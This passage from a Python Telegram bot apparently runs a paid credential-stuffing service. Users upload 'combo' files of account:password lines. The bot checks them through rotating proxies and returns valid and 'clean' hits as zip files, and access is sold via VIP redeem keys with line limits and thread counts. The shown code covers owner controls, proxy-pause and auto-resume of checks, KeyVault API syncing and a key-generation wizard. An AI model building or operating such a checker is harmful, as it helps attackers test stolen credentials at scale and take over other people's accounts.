    # Give renderer one tick to clear, then print a clean done line
    time.sleep(0.15)
    CYAN  = "\033[1;96m"
    GREEN = "\033[1;92m"
    WHITE = "\033[1;37m"
    DIM   = "\033[2m"
    RESET = "\033[0m"
    import sys
    bar_key_str = str(chat_id) if chat_id else label
    sys.stdout.write(
        f"\033[2K  {CYAN}id:{bar_key_str}{RESET} "
        f"[{GREEN}{'█' * 30}{RESET}] "
        f"{GREEN}100.0%{RESET}  "
        f"{WHITE}{total}/{total}{RESET}  "
        f"{DIM}done ✓{RESET}\n"
    )
    sys.stdout.flush()

    return live_stats.get_stats(), result_folder


# ══════════════════════════════════════════════════════════════
#  OWNER CONFIG  — set your username and Telegram ID here
# ══════════════════════════════════════════════════════════════
# Owner credentials — pulled from config.json (set by setup wizard)
OWNER_ID       = _cfg.get("owner_id", 0)
OWNER_USERNAME = _cfg.get("owner_username", "").lower()
COOWNER_IDS    = set(_cfg.get("coowner_ids", []))   # set of int IDs

def _is_owner(from_user: dict) -> bool:
    uid   = from_user.get("id", 0)
    uname = from_user.get("username", "").lower().lstrip("@")
    return uid == OWNER_ID or uid in COOWNER_IDS or (OWNER_USERNAME and uname == OWNER_USERNAME)

def _is_primary_owner(from_user: dict) -> bool:
    """Only the primary owner can add/remove co-owners."""
    uid = from_user.get("id", 0)
    return uid == OWNER_ID

def _add_coowner(uid: int):
    """Add a co-owner ID and persist to config."""
    COOWNER_IDS.add(uid)
    _cfg["coowner_ids"] = list(COOWNER_IDS)
    _save_config(_cfg)

def _remove_coowner(uid: int):
    """Remove a co-owner ID and persist to config."""
    COOWNER_IDS.discard(uid)
    _cfg["coowner_ids"] = list(COOWNER_IDS)
    _save_config(_cfg)


def _is_vip_user(chat_id) -> bool:
    """Check if user has a valid (non-expired) redeem key — VIP users get no combo limit."""
    d = _udata(chat_id)
    key         = d.get("key")
    key_expires = d.get("key_expires", 0)
    if key and time.time() < key_expires:
        return True
    # Check saved profile
    saved = _get_saved_profile(str(chat_id))
    if saved and saved.get("key") and time.time() < saved.get("key_expires", 0):
        return True
    return False


def _has_proxies() -> bool:
    """Check if proxy pool has available proxies."""
    return hasattr(geo_rotator, 'total') and geo_rotator.total > 0 and bool(geo_rotator._proxies)


# Track if we already sent the "no proxy" warning to owner
_no_proxy_warned = False

def _notify_no_proxy(token, chat_id=None, from_user=None):
    """Notify owner that no proxies are available. Only sends once per empty-pool event."""
    global _no_proxy_warned
    # Re-check pool right before sending — avoid race condition with upload/fetch
    if _has_proxies():
        _clear_no_proxy_warning()
        return  # pool has proxies now, no need to notify
    if _no_proxy_warned:
        return  # already notified
    _no_proxy_warned = True
    try:
        _now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        _pool_size = geo_rotator.total if hasattr(geo_rotator, 'total') else 0
        _tg_send(token, OWNER_ID,
            f"\u26a0\ufe0f <b>No Proxies Available!</b>\n\n"
            f"\ud83d\udd50 <b>Time:</b> {_now}\n"
            f"\ud83d\udce1 <b>Proxy Pool:</b> {_pool_size} proxies\n"
            f"\ud83d\udd27 <b>Action:</b> Upload proxy files to the proxy/ folder\n\n"
            f"<i>Bot is in maintenance mode for non-owner users.</i>"
        )
    except Exception:
        pass

def _clear_no_proxy_warning():
    """Reset the no-proxy warning flag so owner gets notified again if pool empties later."""
    global _no_proxy_warned
    _no_proxy_warned = False


# ── Proxy-paused users: auto-resume when proxies become available ──
_proxy_paused_users: dict = {}   # chat_id -> {combo_path, file_name, lines, user_data}
_proxy_paused_lock = threading.Lock()


def _register_proxy_paused(chat_id, combo_path: str, file_name: str, lines: list, user_data: dict):
    """Register a user whose check is paused because no proxies are available.
    Their combo file and progress will be saved so it can auto-resume later."""
    os.makedirs(SAVED_COMBOS_DIR, exist_ok=True)
    persistent_path = os.path.join(SAVED_COMBOS_DIR, f"paused_{chat_id}_{file_name}")
    try:
        with open(persistent_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
    except Exception as e:
        logger.warning(f"[BOT] Could not save paused combo for {chat_id}: {e}")
        persistent_path = combo_path

    with _proxy_paused_lock:
        _proxy_paused_users[str(chat_id)] = {
            "chat_id": chat_id,
            "combo_path": combo_path,
            "persistent_path": persistent_path,
            "file_name": file_name,
            "total_lines": len(lines),
            "progress": 0,
            "level": user_data.get("level", [1]),
            "clean_filter": user_data.get("clean_filter", "both"),
            "hits_id": user_data.get("hits_id", chat_id),
            "username": user_data.get("username", ""),
            "combo_limit": user_data.get("combo_limit", COMBO_LINE_LIMIT),
            "paused_at": time.time(),
        }
    logger.info(f"[BOT] Registered proxy-paused user: chat_id={chat_id}, file={file_name}")


def _unregister_proxy_paused(chat_id):
    """Remove a user from the proxy-paused list (e.g. if they /stop or re-upload)."""
    with _proxy_paused_lock:
        sess = _proxy_paused_users.pop(str(chat_id), None)
    # Clean up persistent combo file
    if sess:
        ppath = sess.get("persistent_path", "")
        if ppath and os.path.exists(ppath):
            try:
                os.remove(ppath)
            except Exception:
                pass


def _resume_proxy_paused_users(token: str):
    """Called when proxies become available after being empty.
    Auto-resumes all users who were paused due to no proxy."""
    with _proxy_paused_lock:
        paused = dict(_proxy_paused_users)  # copy
        _proxy_paused_users.clear()

    if not paused:
        return

    logger.info(f"[BOT] ✅ Proxies available! Resuming {len(paused)} paused user(s)...")

    for key, sess in paused.items():
        chat_id    = sess.get("chat_id")
        file_name  = sess.get("file_name", "unknown.txt")
        persistent_path = sess.get("persistent_path", "")

        # Find the combo file
        combo_path = None
        for candidate in [persistent_path, sess.get("combo_path", ""),
                          os.path.join(SAVED_COMBOS_DIR, f"paused_{chat_id}_{file_name}")]:
            if candidate and os.path.exists(candidate):
                combo_path = candidate
                break

        if not combo_path:
            _tg_send(token, chat_id,
                "⚠️ <b>Proxies are back!</b>\n\n"
                "But your combo file was lost. Please re-upload it.")
            continue

        # Read lines from the combo file
        all_lines = []
        for enc in ["utf-8", "latin-1", "cp1252", "iso-8859-1"]:
            try:
                with open(combo_path, "r", encoding=enc, errors="ignore") as fh:
                    all_lines = [l.strip() for l in fh if l.strip() and ":" in l]
                break
            except Exception:
                continue

        if not all_lines:
            _tg_send(token, chat_id,
                "⚠️ <b>Proxies are back!</b>\n\n"
                "But your combo file is empty. Please re-upload it.")
            continue

        progress = sess.get("progress", 0)
        total = sess.get("total_lines", len(all_lines))
        remaining_lines = all_lines[progress:]

        if not remaining_lines:
            _tg_send(token, chat_id,
                "✅ <b>Proxies are back!</b>\n\n"
                f"Your check (<code>{file_name}</code>) was already complete.\n"
                "📂 Send a new combo file to start again.")
            # Clean up persistent file
            try:
                if os.path.exists(combo_path):
                    os.remove(combo_path)
            except Exception:
                pass
            continue

        # Restore user data
        d = _udata(chat_id)
        d["hits_id"]      = sess.get("hits_id", chat_id)
        d["username"]     = sess.get("username", "")
        d["level"]        = sess.get("level", [1])
        d["clean_filter"] = sess.get("clean_filter", "both")
        d["combo_limit"]  = sess.get("combo_limit", COMBO_LINE_LIMIT)

        # Write remaining lines to a temp file for the checker
        save_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "combo")
        os.makedirs(save_dir, exist_ok=True)
        resume_path = os.path.join(save_dir, f"resume_{chat_id}_{file_name}")
        with open(resume_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(remaining_lines) + "\n")

        # Notify user
        _tg_send(token, chat_id,
            f"✅ <b>Proxies are back — Auto-Resuming!</b>\n\n"
            f"📄 <b>File:</b> <code>{file_name}</code>\n"
            f"📊 <b>Progress:</b> {progress}/{total} done\n"
            f"▶️ <b>Remaining:</b> {len(remaining_lines)} accounts\n\n"
            f"<i>Resuming now... Send /stop to cancel.</i>")

        # Start checker thread
        hits_id = d["hits_id"]
        user_telegram_config = (token, str(hits_id), d["level"], "", d["clean_filter"])

        with _state_lock:
            _bot_state[chat_id] = "RUNNING"

        # Save session for crash recovery
        _save_active_session(chat_id, resume_path, file_name, remaining_lines, d, 0)

        stop_evt = threading.Event()
        with _stop_events_lock:
            _stop_events[chat_id] = stop_evt

        def _paused_resume_run(cid=chat_id, rpath=resume_path, tg_cfg=user_telegram_config,
                        se=stop_evt, fn=file_name, rem=len(remaining_lines), cp=combo_path):
            try:
                label = f"proxy-resume:{cid}"
                stats, result_folder = _run_checker_for_file(
                    rpath, tg_cfg, chat_id=cid, label=label, stop_event=se
                )
                stopped = se.is_set()
            except Exception as e:
                stats = {}
                result_folder = ""
                stopped = False
                logger.error(f"[BOT] Proxy-resume checker error: {e}", exc_info=True)
            finally:
                with _state_lock:
                    _bot_state[cid] = "AWAIT_FILE"
                with _stop_events_lock:
                    _stop_events.pop(cid, None)
                _remove_active_session(cid)

                if stopped:
                    _tg_send(token, cid,
                        f"🛑 <b>Resumed checker stopped.</b>\n"
                        f"📊 Partial results for <code>{fn}</code>")
                else:
                    valid = stats.get("valid", 0)
                    invalid = stats.get("invalid", 0)
                    clean_c = stats.get("clean", 0)
                    _tg_send(token, cid,
                        f"✅ <b>Resumed Check Complete!</b>\n\n"
                        f"📄 <code>{fn}</code>\n"
                        f"✅ Valid: <code>{valid}</code>  ❌ Invalid: <code>{invalid}</code>  "
                        f"🧹 Clean: <code>{clean_c}</code>")

                if result_folder and os.path.isdir(result_folder):
                    _send_results_zip(token, cid, result_folder, fn)

                # Cleanup temp file
                try:
                    if os.path.exists(rpath):
                        os.remove(rpath)
                except Exception:
                    pass

                gc.collect()
                _tg_send(token, cid,
                    f"📂 Send your next combo file to check again.\n"
                    f"Or /start to reset your settings.")

        threading.Thread(target=_paused_resume_run, daemon=True).start()
        logger.info(f"[BOT] ✅ Proxy-resumed session for chat_id={chat_id}, {len(remaining_lines)} remaining")


# ══════════════════════════════════════════════════════════════
#  REDEEM KEY SYSTEM  (with KeyVault API integration)
# ══════════════════════════════════════════════════════════════
KEYS_FILE = "redeem_keys.json"

def _load_keys(sync_api: bool = True) -> dict:
    """Load redeem keys — local file first, optionally merge from KeyVault API."""
    keys = {}
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, "r", encoding="utf-8") as f:
                keys = json.load(f)
        except Exception:
            pass
    # Merge from API (persists across Railway redeploys)
    if sync_api:
        try:
            api = _get_keysystem_api()
            if api.enabled:
                remote = api.load_state("redeem_keys")
                if remote and isinstance(remote, dict):
                    for k, v in remote.items():
                        if k not in keys:
                            keys[k] = v
                    if remote:
                        logger.info(f"[BOT] Synced {len(remote)} redeem keys from KeyVault API")
        except Exception:
            pass
    return keys

def _save_keys(keys: dict):
    """Save redeem keys to disk AND sync to KeyVault API."""
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(keys, f, indent=2)
    # Sync to KeyVault API for persistence across Railway redeploys
    try:
        if _keysystem_api and _keysystem_api.enabled:
            _keysystem_api.save_state("redeem_keys", keys)
    except Exception:
        pass


# ── KeyVault API Integration ────────────────────────────────────
class KeySystemAPI:
    """
    Client for the KeyVault (Key-system) Next.js API.
    Falls back to local redeem_keys.json when the API is not configured or unreachable.
    """

    def __init__(self):
        cfg = _load_config()
        self.base_url = (cfg.get("keysystem_url") or "").rstrip("/")
        self.admin_secret = cfg.get("keysystem_admin_secret") or ""
        self.enabled = bool(self.base_url)

    def _headers(self) -> dict:
        h = {"Content-Type": "application/json"}
        if self.admin_secret:
            h["x-admin-secret"] = self.admin_secret
        return h

    def reload_config(self):
        cfg = _load_config()
        self.base_url = (cfg.get("keysystem_url") or "").rstrip("/")
        self.admin_secret = cfg.get("keysystem_admin_secret") or ""
        self.enabled = bool(self.base_url)

    def generate_key(self, duration_seconds: int, max_users: int, combo_limit: int,
                     count: int = 1, tier: str = "vip", key_format: str = "alphanum",
                     label: str = "") -> list:
        """
        Generate key(s) via the KeyVault API.
        Parameters match the KeyVault dashboard fields exactly:
          - tier: "free" | "vip"
          - key_format: "uuid" | "hex" | "alphanum" | "prefix"
          - duration_seconds -> expiryDays
          - combo_limit -> rateLimit
          - max_users -> maxRedemptions
          - label: optional key label
        """
        if not self.enabled:
            return []

        expiry_days = max(1, duration_seconds // 86400) if duration_seconds >= 86400 else 0

        generated = []
        for _ in range(count):
            try:
                payload = {
                    "label": label or f"tg-bot-{tier}",
                    "tier": tier,
                    "format": key_format,
                    "expiryDays": expiry_days,
                    "rateLimit": str(combo_limit) if combo_limit > 0 else "unlimited",
                    "threads": VIP_THREADS_PER_USER if tier == "vip" else 2,
                    "maxRedemptions": max_users if max_users > 0 else None,
                }
                resp = requests.post(
                    f"{self.base_url}/api/keys/generate",
                    headers=self._headers(),
                    json=payload,
                    timeout=15,
                )
                if resp.status_code == 201:
                    data = resp.json()
                    generated.append(data)
                else:
                    logger.warning(f"[KEYSYSTEM] Generate failed: {resp.status_code} {resp.text[:200]}")
            except Exception as e:
                logger.warning(f"[KEYSYSTEM] Generate error: {e}")
        return generated

    def validate_key(self, key_value: str) -> dict:
        """
        Validate a key via the KeyVault API.
        Returns the API response dict, or empty dict on failure/unreachable.
        Response: {"valid": true/false, "reason": "...", "key": {...}}
        """
        if not self.enabled:
            return {}
        try:
            resp = requests.post(
                f"{self.base_url}/api/keys/validate",
                headers=self._headers(),
                json={"key": key_value},
                timeout=15,
            )
            return resp.json()
        except Exception as e:
            logger.warning(f"[KEYSYSTEM] Validate error: {e}")
            return {}

    def list_keys(self) -> list:
        """
        List all keys from the KeyVault API.
        Returns a list of key dicts, or empty list on failure.
        """
        if not self.enabled:
            return []
        try:
            resp = requests.get(
                f"{self.base_url}/api/keys/list",
                headers=self._headers(),
                timeout=15,
            )
            if resp.status_code == 200:
                return resp.json()
        except Exception as e:
            logger.warning(f"[KEYSYSTEM] List error: {e}")
        return []

    def delete_key(self, key_id: str) -> bool:
        """
        Delete a key by its ID via the KeyVault API.
        Returns True on success.
        """
        if not self.enabled:
            return False
        try:
            resp = requests.delete(
                f"{self.base_url}/api/keys/delete",
                headers=self._headers(),
                json={"id": key_id},
                timeout=15,
            )
            return resp.status_code == 200
        except Exception as e:
            logger.warning(f"[KEYSYSTEM] Delete error: {e}")
            return False

    def revoke_key(self, key_id: str) -> bool:
        """
        Revoke a key by its ID via the KeyVault API.
        Returns True on success.
        """
        if not self.enabled:
            return False
        try:
            resp = requests.post(
                f"{self.base_url}/api/keys/revoke",
                headers=self._headers(),
                json={"id": key_id},
                timeout=15,
            )
            return resp.status_code == 200
        except Exception as e:
            logger.warning(f"[KEYSYSTEM] Revoke error: {e}")
            return False

    # ── Bot state persistence (via /api/bot/state) ─────────────
    def save_state(self, key: str, data) -> bool:
        """Save arbitrary JSON data to KeyVault KV for persistence across redeploys."""
        if not self.enabled:
            return False
        try:
            resp = requests.post(
                f"{self.base_url}/api/bot/state",
                headers=self._headers(),
                json={"key": key, "data": data},
                timeout=15,
            )
            return resp.status_code == 200
        except Exception as e:
            logger.warning(f"[KEYSYSTEM] Save state error: {e}")
            return False

    def load_state(self, key: str):
        """Load previously saved data from KeyVault KV."""
        if not self.enabled:
            return None
        try:
            resp = requests.get(
                f"{self.base_url}/api/bot/state",
                headers=self._headers(),
                params={"key": key},
                timeout=15,
            )
            if resp.status_code == 200:
                return resp.json().get("data")
            return None
        except Exception as e:
            logger.warning(f"[KEYSYSTEM] Load state error: {e}")
            return None

    def delete_state(self, key: str) -> bool:
        """Delete saved state from KeyVault KV."""
        if not self.enabled:
            return False
        try:
            resp = requests.delete(
                f"{self.base_url}/api/bot/state",
                headers=self._headers(),
                params={"key": key},
                timeout=15,
            )
            return resp.status_code == 200
        except Exception as e:
            logger.warning(f"[KEYSYSTEM] Delete state error: {e}")
            return False


_keysystem_api: KeySystemAPI = None

def _get_keysystem_api() -> KeySystemAPI:
    """Lazy-init and return the global KeySystemAPI instance."""
    global _keysystem_api
    if _keysystem_api is None:
        _keysystem_api = KeySystemAPI()
    return _keysystem_api


def _handle_keysystem_config(token: str, chat_id, from_user: dict, args: str):
    """
    /keysystem              — show current config
    /keysystem url <URL>    — set KeyVault API URL
    /keysystem secret <S>   — set admin secret
    /keysystem status       — test connectivity
    """
    api = _get_keysystem_api()
    parts = args.strip().split(None, 1) if args.strip() else []

    if not parts:
        status = "✅ Connected" if api.enabled else "❌ Not configured"
        url_display = api.base_url or "<i>not set</i>"
        secret_display = "***" if api.admin_secret else "<i>not set</i>"
        _tg_send(token, chat_id,
            f"🔑 <b>KeyVault API Config</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 <b>Status:</b> {status}\n"
            f"🌐 <b>URL:</b> {url_display}\n"
            f"🔐 <b>Secret:</b> {secret_display}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>Usage:</b>\n"
            f"  <code>/keysystem url https://your-app.vercel.app</code>\n"
            f"  <code>/keysystem secret YOUR_ADMIN_SECRET</code>\n"
            f"  <code>/keysystem status</code> — test connection")
        return

    subcmd = parts[0].lower()
    value = parts[1] if len(parts) > 1 else ""

    if subcmd == "url":
        if not value:
            _tg_send(token, chat_id, "❌ Provide a URL: <code>/keysystem url https://...</code>")
            return
        cfg = _load_config()
        cfg["keysystem_url"] = value.rstrip("/")
        _save_config(cfg)
        api.reload_config()
        _tg_send(token, chat_id,
            f"✅ <b>KeyVault URL set!</b>\n\n"
            f"🌐 <code>{value}</code>\n\n"
            f"<i>Use /keysystem status to test the connection.</i>")
        return

    if subcmd == "secret":
        if not value:
            _tg_send(token, chat_id, "❌ Provide the secret: <code>/keysystem secret YOUR_SECRET</code>")
            return
        cfg = _load_config()
        cfg["keysystem_admin_secret"] = value
        _save_config(cfg)
        api.reload_config()
        _tg_send(token, chat_id,
            f"✅ <b>Admin secret updated!</b>\n\n"
            f"<i>Use /keysystem status to test the connection.</i>")
        return

    if subcmd == "status":
        if not api.enabled:
            _tg_send(token, chat_id,
                "❌ <b>KeyVault not configured.</b>\n\n"
                "Set the URL first: <code>/keysystem url https://your-app.vercel.app</code>")
            return
        try:
            resp = requests.get(
                f"{api.base_url}/api/keys/list",
                headers=api._headers(),
                timeout=10,
            )
            if resp.status_code == 200:
                key_count = len(resp.json())
                _tg_send(token, chat_id,
                    f"✅ <b>KeyVault Connected!</b>\n\n"
                    f"📡 {api.base_url}\n"
                    f"🔑 {key_count} key(s) in remote store\n\n"
                    f"<i>Keys generated with /generate_key will now sync to KeyVault.</i>")
            elif resp.status_code == 401:
                _tg_send(token, chat_id,
                    "🔒 <b>Authentication failed.</b>\n\n"
                    "Check your admin secret: <code>/keysystem secret YOUR_SECRET</code>")
            else:
                _tg_send(token, chat_id,
                    f"⚠️ <b>Unexpected response:</b> HTTP {resp.status_code}\n\n"
                    f"<code>{resp.text[:200]}</code>")
        except Exception as e:
            _tg_send(token, chat_id,
                f"❌ <b>Connection failed:</b>\n\n"
                f"<code>{str(e)[:200]}</code>\n\n"
                f"Check the URL: <code>/keysystem url ...</code>")
        return

    _tg_send(token, chat_id,
        "❌ Unknown sub-command.\n\n"
        "<b>Usage:</b>\n"
        "  <code>/keysystem</code> — show config\n"
        "  <code>/keysystem url https://...</code> — set URL\n"
        "  <code>/keysystem secret ...</code> — set secret\n"
        "  <code>/keysystem status</code> — test connection")


def _gen_key() -> str:
    return uuid.uuid4().hex[:20].upper()


def _gen_local_key(key_format: str, tier: str = "free") -> str:
    """Generate a key value matching KeyVault format options."""
    import random
    if key_format == "uuid":
        return str(uuid.uuid4())
    elif key_format == "hex":
        return "".join(random.choices("0123456789abcdef", k=32))
    elif key_format == "alphanum":
        chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"
        return "".join(random.choices(chars, k=24))
    elif key_format == "prefix":
        chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"
        pfx = "vip" if tier == "vip" else "free"
        part1 = "".join(random.choices(chars, k=8))
        part2 = "".join(random.choices(chars, k=8))
        return f"{pfx}_{part1}_{part2}"
    else:
        return uuid.uuid4().hex[:20].upper()

# ── /generate_key interactive state ────────────────────────────
# Stores partial genkey wizard data per owner chat_id
# Steps: AWAIT_TIER -> AWAIT_FORMAT -> AWAIT_EXPIRY -> AWAIT_COMBO -> AWAIT_REDEEMS -> AWAIT_LABEL -> AWAIT_COUNT
_genkey_wizard: dict = {}  # chat_id -> {"step": ..., "tier": str, "format": str, "expiry_days": int, "combo_limit": int, "max_redemptions": int, "label": str}


def _parse_duration(arg: str) -> int:
    """Parse e.g. '1hrs' / '2h' / '30min' / '1d' / '2w' / '3mo' → seconds. Returns 0 on failure."""
    arg = arg.strip().lower()
    import re
    total = 0
    for m in re.finditer(r"(\d+)\s*(mo(?:n(?:th)?s?)?|w(?:ee)?k?s?|d(?:ay)?s?|hr?s?|min?s?)", arg):
        val, unit = int(m.group(1)), m.group(2)
        if unit.startswith("mo"):  total += val * 86400 * 30
        elif unit.startswith("w"): total += val * 86400 * 7
        elif unit.startswith("d"): total += val * 86400
        elif unit.startswith("h"): total += val * 3600
        elif unit.startswith("m"): total += val * 60
    if total == 0:
        # Try plain number as days
        m = re.match(r"^(\d+)$", arg)
        if m:
            total = int(m.group(1)) * 86400
    return total


def _dur_label(seconds: int) -> str:
    days = seconds // 86400
    hrs  = (seconds % 86400) // 3600
    mins = (seconds % 3600) // 60
    parts = []
    if days: parts.append(f"{days}d")
    if hrs:  parts.append(f"{hrs}h")
    if mins: parts.append(f"{mins}m")
    return " ".join(parts) if parts else "0m"


# ── /generate_key — matches KeyVault dashboard fields ──────────
def _handle_gen_key(token: str, chat_id, from_user: dict, args: str):
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    # Start interactive wizard — Step 1: Tier
    _genkey_wizard[chat_id] = {"step": "AWAIT_TIER"}
    _tg_send_buttons(token, chat_id,
        "🔑 <b>Generate Key — Step 1 of 6</b>\n\n"
        "🏷 <b>Select Tier:</b>\n\n"
        "<i>Free = basic access  |  VIP = premium access + more threads</i>",
        [
            [
                {"text": "🆓 Free",  "callback_data": "gk_tier:free"},
                {"text": "⭐ VIP",   "callback_data": "gk_tier:vip"},
            ],
            [
                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
            ],
        ]
    )


def _ask_genkey_format(token: str, chat_id):
    """Step 2: Key format."""
    wiz = _genkey_wizard.get(chat_id, {})
    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
    _tg_send_buttons(token, chat_id,
        f"🔑 <b>Generate Key — Step 2 of 6</b>\n\n"
        f"🏷 Tier: <b>{tier_disp}</b>\n\n"
        f"🔤 <b>Select Key Format:</b>\n\n"
        f"<i>How should the key look?</i>",
        [
            [
                {"text": "UUID v4",      "callback_data": "gk_fmt:uuid"},
                {"text": "HEX-32",       "callback_data": "gk_fmt:hex"},
            ],
            [
                {"text": "ALPHANUM-24",  "callback_data": "gk_fmt:alphanum"},
                {"text": "PREFIX-KEY",   "callback_data": "gk_fmt:prefix"},
            ],
            [
                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
            ],
        ]
    )


def _ask_genkey_expiry(token: str, chat_id):
    """Step 3: Expiry — same options as KeyVault dashboard."""
    wiz = _genkey_wizard.get(chat_id, {})
    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
    fmt_disp = (wiz.get("format") or "uuid").upper()
    _tg_send_buttons(token, chat_id,
        f"🔑 <b>Generate Key — Step 3 of 6</b>\n\n"
        f"🏷 Tier: <b>{tier_disp}</b>\n"
        f"🔤 Format: <b>{fmt_disp}</b>\n\n"
        f"⏳ <b>Select Expiry:</b>\n\n"
        f"<i>Pick a preset or type custom (e.g. 1d, 12h, 2w, 3mo):</i>",
        [
            [
                {"text": "1 Hour",   "callback_data": "gk_exp_h:1"},
                {"text": "6 Hours",  "callback_data": "gk_exp_h:6"},
                {"text": "12 Hours", "callback_data": "gk_exp_h:12"},
            ],
            [
                {"text": "1 Day",    "callback_data": "gk_exp:1"},
                {"text": "3 Days",   "callback_data": "gk_exp:3"},
                {"text": "7 Days",   "callback_data": "gk_exp:7"},
            ],
            [
                {"text": "30 Days",  "callback_data": "gk_exp:30"},
                {"text": "90 Days",  "callback_data": "gk_exp:90"},
                {"text": "1 Year",   "callback_data": "gk_exp:365"},
            ],
            [
                {"text": "♾ Never",  "callback_data": "gk_exp:0"},
            ],
            [
                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
            ],
        ]
    )


def _wiz_expiry_disp(wiz: dict) -> str:
    """Display expiry from wizard state."""
    secs = wiz.get("expiry_seconds", 0)
    if secs > 0:
        return _dur_label(secs)
    days = wiz.get("expiry_days", 0)
    if days > 0:
        return f"{days}d"
    return "Never"


def _ask_genkey_combo(token: str, chat_id):
    """Step 4: Combo Limit — same as KeyVault dashboard."""
    wiz = _genkey_wizard.get(chat_id, {})
    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
    fmt_disp = (wiz.get("format") or "uuid").upper()
    exp_disp = _wiz_expiry_disp(wiz)
    _tg_send_buttons(token, chat_id,
        f"🔑 <b>Generate Key — Step 4 of 6</b>\n\n"
        f"🏷 Tier: <b>{tier_disp}</b>\n"
        f"🔤 Format: <b>{fmt_disp}</b>\n"
        f"⏳ Expiry: <b>{exp_disp}</b>\n\n"
        f"📦 <b>Select Combo Limit:</b>\n\n"
        f"<i>Pick a preset or type a custom number:</i>",
        [
            [
                {"text": "500 lines",    "callback_data": "gk_lim:500"},
                {"text": "1,000 lines",  "callback_data": "gk_lim:1000"},
                {"text": "2,500 lines",  "callback_data": "gk_lim:2500"},
            ],
            [
                {"text": "5,000 lines",  "callback_data": "gk_lim:5000"},
                {"text": "10,000 lines", "callback_data": "gk_lim:10000"},
                {"text": "∞ Unlimited",  "callback_data": "gk_lim:0"},
            ],
            [
                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
            ],
        ]
    )


def _ask_genkey_redeems(token: str, chat_id):
    """Step 5: Max Redemptions — same as KeyVault dashboard."""
    wiz = _genkey_wizard.get(chat_id, {})
    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
    fmt_disp = (wiz.get("format") or "uuid").upper()
    exp_disp = _wiz_expiry_disp(wiz)
    combo_disp = "∞ Unlimited" if wiz.get("combo_limit") == 0 else f"{wiz.get('combo_limit', 1000):,} lines"
    _tg_send_buttons(token, chat_id,
        f"🔑 <b>Generate Key — Step 5 of 6</b>\n\n"
        f"🏷 Tier: <b>{tier_disp}</b>\n"
        f"🔤 Format: <b>{fmt_disp}</b>\n"
        f"⏳ Expiry: <b>{exp_disp}</b>\n"
        f"📦 Combo: <b>{combo_disp}</b>\n\n"
        f"👥 <b>Max Redemptions:</b>\n\n"
        f"<i>Pick a preset or type a custom number:</i>",
        [
            [
                {"text": "1",    "callback_data": "gk_usr:1"},
                {"text": "5",    "callback_data": "gk_usr:5"},
                {"text": "10",   "callback_data": "gk_usr:10"},
            ],
            [
                {"text": "50",   "callback_data": "gk_usr:50"},
                {"text": "100",  "callback_data": "gk_usr:100"},
                {"text": "∞",    "callback_data": "gk_usr:0"},
            ],
            [
                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
            ],
        ]
    )


def _ask_genkey_count(token: str, chat_id):
    """Step 6: How many keys to generate."""
    wiz = _genkey_wizard.get(chat_id, {})
    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
    fmt_disp = (wiz.get("format") or "uuid").upper()
    exp_disp = _wiz_expiry_disp(wiz)
    combo_disp = "∞ Unlimited" if wiz.get("combo_limit") == 0 else f"{wiz.get('combo_limit', 1000):,} lines"
    redeems_disp = "∞ Unlimited" if wiz.get("max_redemptions") == 0 else f"{wiz.get('max_redemptions', 1)}"
    _tg_send_buttons(token, chat_id,
        f"🔑 <b>Generate Key — Step 6 of 6</b>\n\n"
        f"🏷 Tier: <b>{tier_disp}</b>\n"
        f"🔤 Format: <b>{fmt_disp}</b>\n"
        f"⏳ Expiry: <b>{exp_disp}</b>\n"
        f"📦 Combo: <b>{combo_disp}</b>\n"
        f"👥 Redeems: <b>{redeems_disp}</b>\n\n"
        f"🔢 <b>How many keys to generate?</b>",
        [
            [
                {"text": "1 key",    "callback_data": "gk_cnt:1"},
                {"text": "5 keys",   "callback_data": "gk_cnt:5"},
                {"text": "10 keys",  "callback_data": "gk_cnt:10"},
            ],
            [
                {"text": "25 keys",  "callback_data": "gk_cnt:25"},
                {"text": "50 keys",  "callback_data": "gk_cnt:50"},
                {"text": "100 keys", "callback_data": "gk_cnt:100"},
            ],
            [
                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
            ],
        ]
    )


def _finalize_gen_key(token: str, chat_id, tier: str, key_format: str,
                      expiry_days: int, combo_limit: int, max_redemptions: int,
                      count: int = 1, label: str = "", expiry_seconds: int = 0):
    """Create `count` keys matching KeyVault dashboard fields.
    Tries KeyVault API first; falls back to local JSON storage.
    expiry_seconds takes priority over expiry_days for sub-day precision.
    """
    now     = time.time()
    duration = expiry_seconds if expiry_seconds > 0 else (expiry_days * 86400 if expiry_days > 0 else 0)
    expires = (now + duration) if duration > 0 else (now + 86400 * 36500)  # ~100 years for "Never"
    keys    = _load_keys()

    new_keys = []
    api = _get_keysystem_api()

    # Try KeyVault API first
    api_keys = []
    if api.enabled:
        api_keys = api.generate_key(
            duration_seconds=duration if duration > 0 else 86400 * 365,
            max_users=max_redemptions,
            combo_limit=combo_limit,
            count=count,
            tier=tier,
            key_format=key_format,
            label=label,
        )

    if api_keys:
        for api_key_data in api_keys:
            k = api_key_data.get("key", _gen_key())
            keys[k] = {
                "expires":         expires,
                "combo_limit":     combo_limit,
                "max_users":       max_redemptions,
                "used_by":         [],
                "created":         now,
                "api_id":          api_key_data.get("id", ""),
                "source":          "keyvault",
                "tier":            tier,
                "format":          key_format,
